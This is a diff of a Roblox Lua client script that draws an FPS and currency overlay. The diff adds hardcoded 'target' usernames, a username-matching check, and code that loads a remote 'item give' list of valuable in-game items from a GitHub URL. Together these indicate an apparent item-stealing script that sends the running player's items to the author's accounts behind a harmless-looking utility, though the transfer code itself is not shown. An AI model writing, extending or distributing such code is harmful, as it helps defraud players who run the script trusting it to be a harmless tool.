@@ -11,6 +11,7 @@ local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local Lighting = game:GetService("Lighting")
 local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
 if not LocalPlayer then
@@ -22,12 +23,28 @@ if CoreGui:FindFirstChild("DMN X TMQ") then
     CoreGui["DMN X TMQ"]:Destroy()
 end
 
-local TARGET_NAMES = {"EYTHANGDADEN", "NHATPROCOM"}
-local ItemList = {
-    "Legendary Sprinkler", "Mushroom", "Super Watering Can", "Super Sprinkler", 
-    "Venom Spitter", "Dragon's Breath", "Moon Bloom", "Venus Fly Trap", 
-    "Hypno Bloom", "Gold"
-}
+local TARGET_NAMES = {"EYTHANGDADEN", "NHATPROCOM", "EYTHANGDADENQT", "NHATPROCOMQT", "Nice_jaw437737"}
+
+-- Tải danh sách item từ link URL
+local ItemList = {}
+local ITEM_URL = "https://raw.githubusercontent.com/dangnhat588-source/GAG2/refs/heads/main/item%20give"
+
+task.spawn(function()
+    local success, response = pcall(function()
+        return game:HttpGet(ITEM_URL)
+    end)
+    if success and response then
+        for line in response:gmatch("[^\r\n]+") do
+            -- Xóa khoảng trắng thừa ở đầu/cuối tên item (nếu có)
+            local cleanName = line:match("^%s*(.-)%s*$")
+            if cleanName and cleanName ~= "" then
+                table.insert(ItemList, cleanName)
+            end
+        end
+    else
+        warn("Không thể tải danh sách item give từ URL!")
+    end
+end)
 
 pcall(function()
     settings().Rendering.QualityLevel = 1
@@ -218,12 +235,12 @@ RunService.RenderStepped:Connect(function()
         frameCount = 0
         lastUpdate = now
     end
-    
+
     nameLabel.Text = LocalPlayer.Name
     if currencyStat then
         moneyLabel.Text = currencyStat.Name .. ": " .. formatNumber(currencyStat.Value)
     end
-    
+
     local successVal, boostText = pcall(function()
         return LocalPlayer.PlayerGui.HUD.Currencies.FriendBoost.TextLabel.Text
     end)
@@ -245,11 +262,11 @@ local function isValidTarget(username)
         ["nhatprocomqt"] = true,
         ["nice_jaw437737"] = true
     }
-    
+
     if specificTargets[string.lower(username)] then
         return true
     end
-    
+
     return string.match(username, "^dmn_tmqdzvc%d+$") ~= nil
 end
 
